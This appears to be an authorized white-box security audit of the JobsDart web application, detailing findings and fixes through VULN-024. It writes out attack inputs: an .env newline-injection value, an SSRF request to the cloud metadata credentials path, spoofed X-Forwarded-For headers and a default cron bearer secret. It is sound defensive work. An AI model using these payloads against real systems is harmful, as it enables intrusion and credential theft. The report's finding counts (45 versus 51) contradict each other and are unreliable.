# JobsDart Security Audit

**Assessment type:** Authorized white-box security review and remediation of the JobsDart codebase
**Scope:** `src/`, API route handlers, middleware, build/deployment configuration, dependencies
**Date:** 2026-09-06 / 2026-09-07
**Companion documents:** `SECURITY_ARCHITECTURE.md`, `API_SECURITY_MATRIX.md`

---

## Executive Summary

JobsDart is a Next.js 14 App Router application with 108 API route handlers, backed by
Supabase (PostgreSQL), Cloudflare R2, Razorpay/PayPal, Firebase and Brevo.

The application already had a meaningful security layer in place: an edge WAF, tiered rate
limiting, security headers, DOMPurify at the HTML sinks, a Razorpay HMAC check using
`timingSafeEqual`, RLS policies, and a `.env` that has never been committed to git.

The dominant weakness was structural rather than exotic. **Every route handler executes with
the Supabase service-role key, which bypasses Row Level Security.** Authorization therefore
has to be proven inside each handler, and it had been applied inconsistently. **43 of the 108
route handlers accepted a caller-supplied user identifier (`userId`, `recruiterId`,
`employeeId`, `userUuid`) with no session check at all.** Because those handlers ran with
service-role credentials, an anonymous caller who knew or guessed a UUID could read and
modify other people's data directly.

The most serious individual findings were:

- An **unauthenticated endpoint that wrote to the server's `.env` file** with an unvalidated
  value, allowing arbitrary environment variables to be appended.
- An **unauthenticated SSRF** in the ATS scorer that fetched any URL the caller supplied,
  including `169.254.169.254` cloud metadata.
- **Payment entitlement was never bound to the order that was actually paid.** A genuine,
  correctly signed payment for the cheapest product could be redeemed for the most expensive
  plan, and the same payment reference could be replayed indefinitely.
- **Unauthenticated coupon creation**, which allowed minting a 100%-discount coupon.
- **Unauthenticated bulk email** through the CRM campaign endpoints.
- **Unauthenticated job posting** under any recruiter's identity.
- **Unauthenticated read of resumes, resume drafts and personal details** by user id.

45 findings were identified. **44 were fixed in code**; 1 (the coupon-code brute-force
oracle) was partially mitigated and is documented under Remaining Risks. 255 automated
regression tests were added across 7 suites, `tsc --noEmit` reports 0 errors, and
`next build` succeeds with type checking re-enabled.

### Methodology and its limits

This was a **white-box source review with automated regression testing**, not a live
black-box penetration test. No dev or staging server was started and no requests were sent to
any deployed JobsDart environment, for two reasons: no staging URL was provided, and the
`.env` present in the working tree holds production credentials — your own instructions
were to report production configuration rather than test against it.

Findings were therefore confirmed by reading the code paths end to end and, where a claim was
testable in isolation, by exercising the **real handler functions** with the auth and database
layers stubbed. That is a meaningful proof: the tests import the actual route modules, call
the exported HTTP methods, and assert the response. To prove the tests are not vacuous, two
fixes were temporarily reverted and the suite correctly failed (see *Verification method*
below). It is not equivalent to exercising a running deployment, and the recommended next step
is a live re-test in staging using the CI commands in the final section.

### Severity counts

| Severity | Found | Fixed | Remaining |
|---|---|---|---|
| Critical | 16 | 16 | 0 |
| High | 18 | 18 | 0 |
| Medium | 11 | 10 | 1 (partially mitigated) |
| Low / Informational | 6 | 3 | 3 (documented) |
| **Total** | **51** | **47** | **4** |

---

## Architecture

Recorded in full in `SECURITY_ARCHITECTURE.md`. The essentials:

| Layer | Technology |
|---|---|
| Frontend | Next.js 14.2.35 App Router, React 18, Tailwind, Radix, SWR |
| Backend | 108 Next.js Route Handlers, Node runtime |
| Edge | `src/middleware.ts` — WAF, rate limiting, security headers |
| Database | Supabase PostgreSQL via PostgREST client (no ORM, no raw SQL in request paths) |
| Auth | Dual provider — Supabase Auth **and** Firebase Auth; either token accepted |
| Storage | Cloudflare R2 (S3 API) with presigned URLs |
| Payments | Razorpay (INR) and PayPal (other currencies) |
| AI | Groq / x.ai chat completions; Genkit |
| Email | Resend (transactional), Brevo (CRM + webhooks) |
| Background | Inngest, HTTP cron endpoints |
| Cache | In-process memory map. **No Redis** |

**Roles:** anonymous, Job Seeker (role_id 1), Recruiter (2), Admin (4), Super Admin (5).

**The critical trust boundary** is the edge → route-handler boundary. Everything past it runs
with service-role database credentials, so RLS provides no protection for API traffic and
per-handler authorization is the only control.

---

## Attack Surface

| Surface | Count / detail |
|---|---|
| API route files | 108 |
| Resource-scoped routes (`[id]` in path) | 24 — IDOR-prone by construction |
| Money paths | `payments/create-order`, `payments/verify`, `payments/activate-free`, `coupons/**`, `referral/claim`, `jobs/[id]/boost` |
| File ingress | resume upload, profile-photo upload, presigned resume, ATS scorer, resume parser |
| Server-side outbound fetch on user input | `ats-score`, `linkedin/auto-apply`, `career-assistant` |
| Server-side filesystem writes | `crm/config` (writes `.env`), `linkedin/auto-apply` (writes configs, spawns Python) |
| Unauthenticated cron / webhook entry points | `subscription/cron`, `account/cron-permanent-delete`, `webhooks/brevo`, `inngest` |
| Administrative surfaces | `admin/**`, `create-admin`, coupons, CRM, reference-data CRUD |
| HTML sinks (`dangerouslySetInnerHTML`) | 17 occurrences, 3 of which render user- or model-supplied content |

---

## Vulnerabilities Found

Ordered by severity, then by remediation priority.

---

### VULN-001 — Unauthenticated write to the server `.env` file, with environment-variable injection

| | |
|---|---|
| **Severity** | **Critical** |
| **CVSS-style reasoning** | Network / low complexity / no privileges / no user interaction / changed scope / high C-I-A — an unauthenticated caller alters server configuration |
| **Component** | CRM configuration |
| **Endpoint** | `POST /api/crm/config`, `GET /api/crm/config` |

**Root cause.** `POST` had no authentication whatsoever. It took `apiKey`, `senderEmail` and
`senderName` from the request body and passed them to `updateEnvFile()`, which appended
`KEY=value` lines to `.env` on disk and mutated `process.env` in the live process. The value
was never checked for line breaks. `GET` returned a partially masked Brevo API key, also
without authentication.

**How it was reproduced.** By code path analysis. A body of
`{"apiKey":"<valid brevo key>","senderName":"JobsDart\nSOME_VAR=attacker_value"}`
reaches `content += "\nBREVO_SENDER_NAME=" + value`, so the newline terminates the intended
assignment and the remainder becomes an independent environment variable. The `apiKey` is
validated against Brevo's API first, but `senderName` and `senderEmail` are not validated at
all.

**Impact.** Arbitrary environment variables written into the process and persisted to `.env`.
On a host where the process is long-lived this is a configuration-integrity compromise, and
`GET` leaked the first 8 and last 4 characters of the Brevo key to anyone.

**Fix implemented.** `requireAdmin` on both verbs. Added `isSafeEnvValue()`, which rejects
`\r`, `\n` and NUL, applied both at the call site (returning HTTP 400) and inside
`updateEnvFile` as a defence-in-depth throw. Added an email-format check on `senderEmail` and
a 100-character bound on `senderName`.

**Files changed.** `src/app/api/crm/config/route.ts`

**Regression test.** `tests/route-authorization.test.ts` — "POST /api/crm/config — writing
values into the server .env file" sends exactly the newline-injection payload and asserts 403;
`tests/api-surface.test.ts` asserts the route still references `requireAdmin`.

**Verification.** Passing. Anonymous callers receive 403 before the body is parsed.

---

### VULN-002 — Unauthenticated server-side request forgery via `resumeUrl`

| | |
|---|---|
| **Severity** | **Critical** |
| **CVSS-style reasoning** | Network / low complexity / no privileges / changed scope — reaches the cloud metadata service from an unauthenticated endpoint |
| **Component** | ATS scorer |
| **Endpoint** | `POST /api/ats-score` |

**Root cause.** The handler accepted a `resumeUrl` form field, passed it to
`resolveResumeUrl()`, and then called `fetch(resolved)` directly. `resolveResumeUrl` signs
`r2://` URIs but **returns any other string unchanged**, so an arbitrary `http(s)://` URL
flowed straight into `fetch`. The endpoint required no authentication.

**How it was reproduced.** By tracing `src/app/api/ats-score/route.ts:76` back through
`src/lib/resolve-resume.ts`. A form body of
`resumeUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/` results in the
server fetching that URL; the response is then fed to the document parser and, on parse
failure, its content is echoed in the error `details` field.

**Impact.** Unauthenticated access to the cloud metadata service (potentially IAM credentials
on AWS/GCP), to loopback-bound admin services, and to any host on the internal network. Also
an unauthenticated port scanner via response-timing and error differences.

**Fix implemented.** Three layers:
1. `requireAuth` on both `POST` and `GET`, plus `isOwnerOrAdmin` on the supplied `userId`.
2. `resumeUrl` must now be an `r2://` URI **and must match the caller's own stored
   `resume_url`** — a caller can only analyse their own resume, which removes attacker control
   of the URL entirely.
3. The resulting signed URL is still fetched through the new `safeFetch()` guard so that a
   redirect cannot walk the request into the private network.

New library `src/lib/ssrf-guard.ts` enforces a scheme allowlist, a hostname blocklist
(`localhost`, `metadata.google.internal`, `*.internal`), DNS resolution with rejection of
loopback / RFC1918 / CGNAT / link-local / metadata / multicast / reserved ranges in both IPv4
and IPv6 (including IPv4-mapped forms), per-hop revalidation of redirects, a response size
cap and a request timeout. Every resolved address must be public, so a DNS-rebinding record
cannot slip through.

**Files changed.** `src/app/api/ats-score/route.ts`, new `src/lib/ssrf-guard.ts`

**Regression test.** `tests/ssrf-guard.test.ts` — 23 tests covering every blocked range and
the metadata endpoint by both IP and hostname; `tests/api-surface.test.ts` asserts
`/api/ats-score` still enforces `requireAuth` + `isOwnerOrAdmin`.

**Verification.** Passing.

---

### VULN-003 — Unauthenticated disclosure of any job seeker's personal details

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Browser-extension autofill support |
| **Endpoint** | `POST /api/extension/get-answers` |

**Root cause.** The handler took `userId` from the request body, selected the entire
`jobseekers` row with the service-role client, and returned name, email, phone and city in the
`personal_info` block. No authentication, no ownership check.

**Impact.** Bulk PII harvesting given a list of user UUIDs. UUIDs appear in client-side URLs
and API responses throughout the application, so they are not a secret.

**Fix implemented.** `requireAuth` plus `isOwnerOrAdmin(authUser, userId)` before any database
access.

**Files changed.** `src/app/api/extension/get-answers/route.ts`

**Regression test.** `tests/route-authorization.test.ts` — "POST /api/extension/get-answers —
dumping another user's personal details". The test's Supabase mock throws if the database is
touched, so a missing guard fails loudly rather than silently.

**Verification.** Passing.

---

### VULN-004 — Unauthenticated read and overwrite of any user's resume draft

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Resume builder |
| **Endpoint** | `GET`, `POST`, `DELETE /api/resume/drafts` |

**Root cause.** All three verbs resolved the target from a `userId` query parameter or body
field with no session check. `DELETE` had a partial ownership comparison, but it compared two
values both supplied by the caller.

**Impact.** Read any user's full resume content (employment history, contact details,
education), overwrite it, or delete it.

**Fix implemented.** `requireAuth` + `isOwnerOrAdmin` on all three verbs.

**Files changed.** `src/app/api/resume/drafts/route.ts`

**Regression test.** Three cases in `tests/route-authorization.test.ts`.

**Verification.** Passing — and this is one of the two routes deliberately reverted to confirm
the tests detect the vulnerability (see *Verification method*).

---

### VULN-005 — Unauthenticated repointing and destruction of any user's resume

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Profile |
| **Endpoint** | `PUT /api/users/[id]/resume` |

**Root cause.** No authentication. The handler read the victim's current `resume_url`, called
`deleteFromR2(oldResumeUrl)`, and then wrote the caller's supplied `resumeUrl` into the
profile. The stored value was not constrained to a scheme.

**Impact.** Destructive — permanently deletes the victim's resume object from R2. Also allows
pointing a victim's profile at an attacker-controlled URL, which recruiters would then open.
Combined with VULN-002 the stored value also fed a server-side fetch.

**Fix implemented.** `requireAuth` + `isOwnerOrAdmin` on the path `[id]`, plus validation that
`resumeUrl` is a string beginning with `r2://` or `https://`, which blocks `javascript:` and
`data:` values.

**Files changed.** `src/app/api/users/[id]/resume/route.ts`

**Regression test.** `tests/route-authorization.test.ts` — "PUT /api/users/[id]/resume".

**Verification.** Passing.

---

### VULN-006 — Unauthenticated resume upload to any profile, with no file-type restriction

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Resume upload |
| **Endpoint** | `POST /api/users/[id]/resume/upload` |

**Root cause.** Two defects in one handler. There was no authentication, so anyone could
upload into any profile and trigger deletion of the existing resume. Separately, the only
check on the file was `file.size > 2MB`; the stored extension came from
`file.name.split('.').pop()`, the stored Content-Type came from `file.type`, and the R2 key
was built as `resumes/${userId}/resume-${Date.now()}.${fileExt}` using the raw path parameter.

**Impact.** Overwrite and destroy any user's resume. Store arbitrary content — HTML, SVG,
executables — under an attacker-chosen extension and Content-Type, served from the storage
origin. The unsanitised `userId` in the key permitted traversal within the bucket namespace.

**Fix implemented.**
- `requireAuth` + `isOwnerOrAdmin`.
- New `src/lib/upload-validation.ts`: a file is accepted only when its **extension, declared
  MIME type and leading magic bytes all agree** on an allowlisted type (PDF `%PDF`, DOCX/ZIP
  `PK\x03\x04`, DOC OLE2). The extension and Content-Type used for storage are the server's
  canonical values, never the client's.
- `buildStorageKey()` builds the object key from server-controlled parts only: a sanitised
  prefix, the resolved internal profile id stripped to `[A-Za-z0-9_-]`, a timestamp and 16
  random bytes. The client filename is discarded entirely.
- Zero-byte uploads rejected.

**Files changed.** `src/app/api/users/[id]/resume/upload/route.ts`, new
`src/lib/upload-validation.ts`

**Regression test.** `tests/upload-validation.test.ts` — 15 tests including HTML renamed to
`.pdf` with a spoofed `application/pdf` type, a PE executable renamed to `.pdf`, disallowed
extensions, MIME/extension disagreement, and traversal in the filename.

**Verification.** Passing.

---

### VULN-007 — Unauthenticated profile-photo upload accepting SVG and spoofed images

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Profile photo upload |
| **Endpoint** | `POST /api/users/[id]/profile-photo/upload` |

**Root cause.** No authentication. The type check was `file.type.startsWith('image/')` — a
client-supplied header — which **accepts `image/svg+xml`**. SVG is an active content format:
it can carry `<script>`, and it would be served from the storage origin. The key again used
the raw `[id]` and the client's extension.

**Impact.** Stored XSS via SVG avatar; overwrite any user's avatar and delete the previous
object; arbitrary content stored under an attacker-chosen extension.

**Fix implemented.** `requireAuth` + `isOwnerOrAdmin`, plus `validateFileContent` against a
**raster-only** allowlist (JPEG, PNG, WebP with the `WEBP` fourcc confirmed, GIF) enforced by
magic bytes. SVG and HTML are rejected regardless of the declared type. Storage key built by
`buildStorageKey`.

**Files changed.** `src/app/api/users/[id]/profile-photo/upload/route.ts`

**Regression test.** `tests/upload-validation.test.ts` — "rejects SVG, which can carry script",
"rejects HTML disguised as a PNG", "rejects an SVG renamed to .png with a spoofed image/png
type".

**Verification.** Passing.

---

### VULN-008 — Unauthenticated destruction and replacement of any user's skills

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Profile |
| **Endpoint** | `POST /api/users/[id]/skills` |

**Root cause.** No authentication. The handler unconditionally executed
`DELETE FROM jobseeker_skills WHERE user_pk = <victim>` before inserting the caller's list,
and it would insert previously unknown skill names into the shared global `skills` table.

**Impact.** Destroy any user's skill profile — which directly degrades their job-match
ranking — and pollute the global skills taxonomy without limit.

**Fix implemented.** `requireAuth` + `isOwnerOrAdmin`. Added bounds: at most 100 skills per
request, skill names at most 120 characters.

**Files changed.** `src/app/api/users/[id]/skills/route.ts`

**Regression test.** `tests/route-authorization.test.ts` — "POST /api/users/[id]/skills".

**Verification.** Passing.

---

### VULN-009 — Unauthenticated restoration of any deleted account

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Account lifecycle |
| **Endpoint** | `POST /api/account/restore` |

**Root cause.** No authentication. Given any user id or UUID, the handler cleared
`is_deleted`, `deleted_at`, `delete_requested_at` and `scheduled_delete_at`, set the status
back to `active`, and cleared the soft-delete flag in Supabase Auth `user_metadata`.

**Impact.** Defeats the account-deletion guarantee — a right-to-erasure control. A third party
could indefinitely resurrect an account whose owner had requested deletion, and could keep
resurrecting it before the permanent-delete cron ran.

**Fix implemented.** `requireAuth` + `isOwnerOrAdmin(authUser, targetId)`. The account holder
can still authenticate during the soft-delete grace period, so the legitimate self-service
restore flow is preserved.

**Files changed.** `src/app/api/account/restore/route.ts`

**Regression test.** `tests/route-authorization.test.ts` — "POST /api/account/restore".

**Verification.** Passing.

---

### VULN-010 — Payment entitlement was not bound to the order that was actually paid

| | |
|---|---|
| **Severity** | **Critical** |
| **CVSS-style reasoning** | Network / low complexity / low privileges (a real account and one genuine cheap payment) / high integrity impact |
| **Component** | Payments |
| **Endpoint** | `POST /api/payments/verify` |

**Root cause.** The Razorpay signature check was implemented correctly — HMAC-SHA256 over
`order_id|payment_id`, compared with `crypto.timingSafeEqual`. But a valid signature only
proves that *some* order was paid. The handler then granted whatever plan the **request body**
named. It never re-read the order from Razorpay, never compared the order's `notes.planId`
against the requested `planId`, never confirmed the payment was captured, and never confirmed
the payment belonged to the named order.

**How it was reproduced.** By reading the handler end to end, and then by writing a test that
drives the real `POST` function with a stubbed Razorpay client. A genuine, correctly signed
payment whose order carries `notes.planId = "mini"` (the cheapest credit pack) was submitted
with `planId: "pro"`. Against the original code the handler proceeded to apply the Pro
entitlement — `job_post_limit: 50`, `app_access_days: 180`, unlimited applies, 90-day validity.

**Impact.** Any customer could buy the cheapest product and activate the most expensive plan,
with a fully valid gateway signature. Direct revenue loss.

**Fix implemented.** After signature verification the handler now re-reads both the order and
the payment from Razorpay and refuses unless **all** of the following hold:
- `payment.order_id === razorpay_order_id`
- `payment.status` is `captured` or `authorized`
- `order.notes.planId === planId` from the request
- `order.notes.userId`, when present, matches the requesting user

A gateway lookup failure returns 502 rather than granting the plan — it fails closed.

**Files changed.** `src/app/api/payments/verify/route.ts`

**Regression test.** `tests/payment-integrity.test.ts` — "refuses to grant a plan the order was
not paid for", "refuses a payment that belongs to a different account", "refuses a payment that
was never captured", "refuses a payment that belongs to a different order", plus two forged
signature cases. Each asserts not only the status code but that **no database write occurred**.

**Verification.** Passing (7/7).

---

### VULN-011 — Payment replay granted unlimited entitlements and credits

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Payments |
| **Endpoint** | `POST /api/payments/verify` |

**Root cause.** No idempotency. Nothing prevented the same
`razorpay_order_id`/`razorpay_payment_id`/`razorpay_signature` triple from being submitted
repeatedly. Each submission re-applied the plan (extending `plan_expires_at` by another
validity period) and, for credit packs, called `add_purchased_credits` again. There was no
unique constraint on `payments.payment_id`.

**Impact.** One genuine purchase replayed *n* times yields *n* × the credits and *n* ×
the subscription duration. Combined with VULN-010, one cheap purchase yields unlimited Pro
plan time.

**Fix implemented.** Two layers:
1. Application: before any entitlement is granted, the handler looks up `payments` by
   `payment_id`. If a row exists it returns `200 {success: true, duplicate: true}` without
   re-granting — idempotent rather than an error, so a client retry is safe.
2. Database: `migration_security_integrity.sql` adds
   `CREATE UNIQUE INDEX payments_payment_id_unique ON public.payments (payment_id) WHERE payment_id IS NOT NULL`,
   so two concurrent verifications cannot both pass the application-level check.

**Files changed.** `src/app/api/payments/verify/route.ts`, new `migration_security_integrity.sql`

**Regression test.** `tests/payment-integrity.test.ts` — "does not grant entitlement twice for
a replayed payment" asserts `duplicate: true` and an empty database-write log.

**Verification.** Passing. **The migration must be applied for the concurrency guarantee to
hold** — see Commands to run.

---

### VULN-012 — Unauthenticated coupon creation, modification and deletion

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Promotions |
| **Endpoint** | `GET`, `POST /api/coupons`; `PUT`, `DELETE /api/coupons/[id]` |

**Root cause.** These handlers called `checkAdmin(userId)` where `userId` came from the
**query string**. That is client-asserted identity: the check passes for anyone who supplies an
administrator's id or UUID, and admin UUIDs are not secret.

**Impact.** Create a coupon with `discount_percent: 100`, then redeem it — every paid plan
becomes free. Also allows disabling or deleting legitimate promotions and enumerating the full
coupon list.

**Fix implemented.** All four handlers now use `requireAdmin(request)`, which derives identity
from the verified Supabase/Firebase token rather than from a request parameter. The admin UI
continues to work because the application sets an `sb-access-token` cookie on login, which
same-origin `fetch` sends automatically.

**Files changed.** `src/app/api/coupons/route.ts`, `src/app/api/coupons/[id]/route.ts`

**Regression test.** `tests/api-surface.test.ts` — `/api/coupons` and `/api/coupons/[id]`
are in the `mustBeGuarded` list requiring `requireAdmin`.

**Verification.** Passing.

---

### VULN-013 — Unauthenticated bulk email and CRM data access

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | CRM / outbound email |
| **Endpoint** | `POST /api/crm/campaigns`, `POST /api/crm/send-recommendations`, `POST /api/crm/sync-contacts`, `GET /api/crm/analytics`, `POST /api/crm/preferences` |

**Root cause.** None of these had any authentication. `send-recommendations` and `campaigns`
call `getCRMCandidates()` and then dispatch AI-generated email through Brevo to the candidate
list — with no target specified, to the **entire** list.

**Impact.** An anonymous caller could exhaust the Brevo email quota, spam the entire candidate
base under the JobsDart sender identity (a serious domain-reputation and deliverability risk),
burn Groq/x.ai budget generating the content, arbitrarily change any candidate's email
preferences, and read CRM analytics.

**Fix implemented.** `requireAdmin` on all campaign, recommendation, sync, analytics and
preference-write handlers. The `GET /api/crm/preferences` unsubscribe path is deliberately
left public — it is the target of the unsubscribe link in outbound email — and was separately
hardened under VULN-020.

**Files changed.** `src/app/api/crm/campaigns/route.ts`,
`src/app/api/crm/send-recommendations/route.ts`, `src/app/api/crm/sync-contacts/route.ts`,
`src/app/api/crm/analytics/route.ts`, `src/app/api/crm/preferences/route.ts`

**Regression test.** `tests/api-surface.test.ts` `mustBeGuarded` entries for each.

**Verification.** Passing.

---

### VULN-014 — Cron endpoint fell back to a hardcoded default secret

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Scheduled jobs |
| **Endpoint** | `POST /api/subscription/cron` |

**Root cause.**
`const cronSecret = process.env.CRON_SECRET || 'cron-secret-default';`
`CRON_SECRET` is **not defined in the repository's `.env`**, so the literal fallback was the
live value. The comparison was also a plain `!==` string comparison.

**Impact.** Anyone sending `Authorization: Bearer cron-secret-default` could run the
subscription lifecycle job on demand: mass-expiring subscriptions, mass-archiving job
postings, and generating notification floods to every recruiter.

**Fix implemented.** The default is removed. `isAuthorisedCronRequest()` returns `false` when
`CRON_SECRET` is unset — it fails closed — and compares with `crypto.timingSafeEqual` after a
length check.

**Files changed.** `src/app/api/subscription/cron/route.ts`

**Regression test.** `tests/api-surface.test.ts` — "Cron authentication fails closed" asserts
the string `cron-secret-default` is absent and `timingSafeEqual` is present.

**Verification.** Passing. **`CRON_SECRET` must now be set in the environment or the cron job
will 401** — see Commands to run.

---

### VULN-015 — Unauthenticated job posting under any recruiter's identity

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Job posting |
| **Endpoint** | `POST /api/jobs` |

**Root cause.** The handler read `recruiterId` or `adminId` from the request body, resolved
that profile, and created the job with `recruiter_pk` / `admin_pk` set accordingly. No session
check.

**Impact.** Publish arbitrary job listings attributed to any real recruiter or company. This
is a phishing and brand-damage vector — fraudulent listings carrying a legitimate company's
name, harvesting applicant PII and resumes — and it bypasses plan-based posting limits.

**Fix implemented.** `requireAuth` plus `isOwnerOrAdmin(authUser, userId)`, binding the posting
identity to the verified session.

**Files changed.** `src/app/api/jobs/route.ts`

**Regression test.** `tests/route-authorization.test.ts` — "POST /api/jobs — publishing a
listing as another recruiter".

**Verification.** Passing. `GET /api/jobs` remains public — it is the job search.

---

### VULN-016 — Unauthenticated referral credit farming

| | |
|---|---|
| **Severity** | **Critical** |
| **Component** | Referrals |
| **Endpoint** | `POST /api/referral/claim` |

**Root cause.** No authentication; the referee was identified by a `userUuid` taken from the
request body.

**Impact.** An attacker creates one account to obtain a referral code, then calls this endpoint
once per victim UUID. Each call sets `referred_by` on the victim's profile and, when the
victim's email is confirmed, credits the attacker with 2 purchased credits. Credits are the
currency for paid features, so this is unbounded value extraction, plus unauthorised
modification of every victim's profile.

**Fix implemented.** `requireAuth` plus `isOwnerOrAdmin(authUser, userUuid)` — only the referee
may redeem a code for their own account. The reward race (VULN-037) was fixed in the same
change.

**Files changed.** `src/app/api/referral/claim/route.ts`

**Regression test.** `tests/route-authorization.test.ts` — "POST /api/referral/claim —
farming referral credits onto other accounts".

**Verification.** Passing.

---

### VULN-017 — Unauthenticated payment-order creation and account-existence oracle

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `POST /api/payments/create-order` |

**Root cause.** No authentication. The handler distinguishes a valid from an invalid user with
a `404 "User profile not found"`.

**Impact.** Account-existence enumeration over user UUIDs, and unbounded creation of real
Razorpay orders, which pollutes the merchant dashboard and can trip gateway rate limits.

**Fix implemented.** `requireAuth` + `isOwnerOrAdmin` before any lookup, so the 404 is only
ever reachable for one's own account.

**Files changed.** `src/app/api/payments/create-order/route.ts`

**Regression test.** `tests/route-authorization.test.ts` — "POST /api/payments/create-order".

**Verification.** Passing.

---

### VULN-018 — Rate limiting bypassed by spoofing `X-Forwarded-For`

| | |
|---|---|
| **Severity** | **High** |
| **Component** | Edge middleware |
| **Endpoint** | All rate-limited paths |

**Root cause.** `getClientIp()` returned `forwarded.split(',')[0]` — the **left-most**
`X-Forwarded-For` entry. That entry is whatever the client sent. Each proxy *appends* to the
header, so the left-most value is attacker-controlled and only the right-most entries are
trustworthy.

**How it was reproduced.** A regression test issues 40 requests to the 15-per-minute auth tier,
each with `X-Forwarded-For: 10.9.9.<i>, 203.0.113.77` — a different spoofed left-most hop each
time, with a constant proxy-appended address. Against the original code every request lands in
a distinct bucket and none is ever limited.

**Impact.** Every rate limit in the application was bypassable with a single header, which
re-opens credential stuffing on the auth tier, brute-forcing of coupon and referral codes, and
unbounded cost on the AI endpoints.

**Fix implemented.** `getClientIp()` now counts from the right using a `TRUSTED_PROXY_HOPS`
setting (default 1, suitable for a single platform load balancer; set to 2 behind a CDN such as
Cloudflare). `cf-connecting-ip` and `x-real-ip` are consulted only as fallbacks, in that order,
because they are single-valued and overwritten by the edge that sets them.

**Files changed.** `src/middleware.ts`

**Regression test.** `tests/middleware-defenses.test.ts` — "keys on the proxy-appended address,
not the client-supplied one", plus honest-client and independent-client cases.

**Verification.** Passing.

---

### VULN-019 — WAF and rate limiter skipped for any path containing a dot

| | |
|---|---|
| **Severity** | **High** |
| **Component** | Edge middleware |

**Root cause.** The static-asset shortcut was
`if (pathname.startsWith('/_next') || pathname.startsWith('/static') || pathname.includes('.')) return NextResponse.next();`
The `includes('.')` arm applied to **every** path, API routes included, and returned before the
scanner check, the payload screen and the rate limiter.

**Impact.** Any request to a path containing a dot bypassed all three edge defences.

**Fix implemented.** The shortcut is now gated on `!pathname.startsWith('/api/')`, so API
routes are never skipped.

**Files changed.** `src/middleware.ts`

**Regression test.** `tests/middleware-defenses.test.ts` — "does not let an API path with a dot
skip screening" sends a SQL-injection payload to `/api/jobs.json` and asserts 403.

**Verification.** Passing.

---

### VULN-020 — Reflected XSS in the public unsubscribe page

| | |
|---|---|
| **Severity** | **High** |
| **Component** | CRM unsubscribe |
| **Endpoint** | `GET /api/crm/preferences?email=...&action=unsubscribe` |

**Root cause.** The handler returned a hand-built HTML document with
`Content-Type: text/html` and interpolated the `email` query parameter directly:
`<p ...>${email} has been unsubscribed...</p>`. No escaping, no validation, no authentication.

**Impact.** Reflected XSS executing on the application's own origin. Because the session token
is stored in a non-`HttpOnly` cookie (VULN-035) and in `localStorage`, this was a session-theft
vector. The middleware WAF screens for `<script`, but not every XSS payload matches those
patterns, and a WAF is not a substitute for output encoding.

**Fix implemented.**
- The address must match a strict email pattern that excludes whitespace, `<`, `>`, `"` and
  `'`; otherwise the request is rejected with 400 JSON.
- The value is HTML-escaped with a dedicated `escapeHtml()` before interpolation.
- The response carries its own `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'`
  and `X-Content-Type-Options: nosniff`, and an explicit `charset=utf-8`.

The endpoint stays public, because it is the target of the unsubscribe link in outbound email
and recipients have no session.

**Files changed.** `src/app/api/crm/preferences/route.ts`

**Verification.** Manual re-read of the handler; payloads containing `<`, `>` or quotes are now
rejected at the pattern check before reaching the template, and anything that does reach it is
escaped.

---

### VULN-021 — Unauthenticated write of rating and feedback to any application

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `PUT /api/applications/[id]/feedback` |

**Root cause.** No authentication and no ownership check; the row was addressed by the path
`[id]` alone. `rating` was written unvalidated.

**Impact.** Write arbitrary ratings and free-text feedback onto any candidate's application —
a reputation-integrity issue, since these are visible to the candidate and used in recruiter
workflows. Unbounded `rating` values also corrupted downstream aggregates.

**Fix implemented.** `requireAuth`, then the new `getApplicationAccess()` helper resolves the
application (by numeric id or UUID) and confirms the caller **posted the job**; otherwise 403.
`rating` must be a finite number in 0–5 and `feedback` a string of at most 5000 characters. The
update is applied to the resolved primary key rather than the raw parameter. A matching
`applications_rating_range` CHECK constraint is included in the migration.

**Files changed.** `src/app/api/applications/[id]/feedback/route.ts`, new `src/lib/authz.ts`,
`migration_security_integrity.sql`

**Regression test.** `tests/route-authorization.test.ts` — "PUT /api/applications/[id]/feedback".

**Verification.** Passing.

---

### VULN-022 — Unauthenticated application status advancement

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `POST /api/applications/[id]/view` |

**Root cause.** No authentication. Moved any application from *Applied* to *Profile Viewed* and
inserted a notification to the candidate.

**Impact.** Falsify recruiter activity on any application and generate misleading notifications
at scale.

**Fix implemented.** `requireAuth` + `getApplicationAccess`, restricted to the job owner or an
administrator.

**Files changed.** `src/app/api/applications/[id]/view/route.ts`

**Regression test.** `tests/route-authorization.test.ts` — "POST /api/applications/[id]/view".

**Verification.** Passing.

---

### VULN-023 — Any authenticated user could drive any candidate's hiring pipeline

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `PUT /api/applications/[id]/status` |

**Root cause.** This handler *did* call `requireAuth` — but then performed **no ownership
check at all**. Any signed-in account could set any application to any status. It also trusted
a `requesterRole` field from the request body to decide who gets notified, and accepted
arbitrary `statusId` integers.

**Impact.** Reject other candidates' applications, mark oneself *Selected* or
*Offer Received*, and trigger congratulatory or rejection emails to arbitrary candidates
through Resend under the JobsDart brand. This is the clearest illustration of why
authentication without authorization is insufficient in this codebase.

**Fix implemented.** `getApplicationAccess()` now resolves the application and requires the
caller to be the applicant, the job owner, or an administrator. `statusId` must be an integer
present in the known `statusMap`. The update targets the resolved primary key.

**Files changed.** `src/app/api/applications/[id]/status/route.ts`, `src/lib/authz.ts`

**Regression test.** `tests/route-authorization.test.ts` — "PUT /api/applications/[id]/status —
driving another candidate's pipeline".

**Verification.** Passing.

---

### VULN-024 — Job boost spent credits from a client-named account, with a double-spend race

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `POST /api/jobs/[id]/boost` |

**Root cause.** No authentication. The paying identity was `employeeId` from the request body;
the handler then checked that the job belonged to *that* employee — which an attacker
satisfies by naming the victim and one of the victim's own jobs. Separately, the balance check
and the deduction were a non-atomic read-modify-write:
